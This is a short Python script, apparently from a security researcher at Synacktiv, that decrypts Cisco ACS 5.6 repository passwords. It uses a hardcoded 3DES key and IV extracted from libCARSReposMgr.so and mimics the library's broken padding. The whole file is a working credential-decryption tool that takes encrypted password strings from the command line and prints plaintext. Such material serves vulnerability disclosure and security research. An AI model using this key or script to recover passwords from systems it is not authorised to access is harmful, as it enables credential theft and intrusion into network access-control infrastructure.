#!/usr/bin/env python
# decrypt Cisco ACS repository passwords
# implemented in libCARSReposMgr.so / _carsHashPassword
#
# tested with Cisco ACS 5.6
#
#   -- nicolas.collignon - AT - synacktiv.com

from Crypto.Cipher import DES3

keys = b'\x73\x04\x91\x2F\x3D\x62\xB5\xEF\xCD\x83\x73\x73\xBF\x6B\x7F\xF4\xF1\xF4\x38\xB6\xB6\x70\x08\xEF'
IV = b'\x0A'*8

def cisco_acs_decrypt(encrypted_passwd):
	cipher = DES3.new(keys, DES3.MODE_CBC, IV=IV)
	# libCARSReposMgr.so 3DES padding handling is wrong...
	# we try to mimick the behavior here.
	pad = (len(encrypted_passwd) & 7)
	encrypted_passwd += '\x00'*(8-pad)
	decrypted_passwd = cipher.decrypt(encrypted_passwd)
	decrypted_passwd = decrypted_passwd[:16].rstrip('\x00')

	return decrypted_passwd

if __name__ == '__main__':
	from sys import argv, stdout

	if len(argv) < 2:
		stdout.write('usage: %s <pass1> [pass2..]\n' % argv[0])
	else:
		for arg in argv[1:]:
			stdout.write('%s => %s\n'%(arg,cisco_acs_decrypt(arg.decode('hex'))))

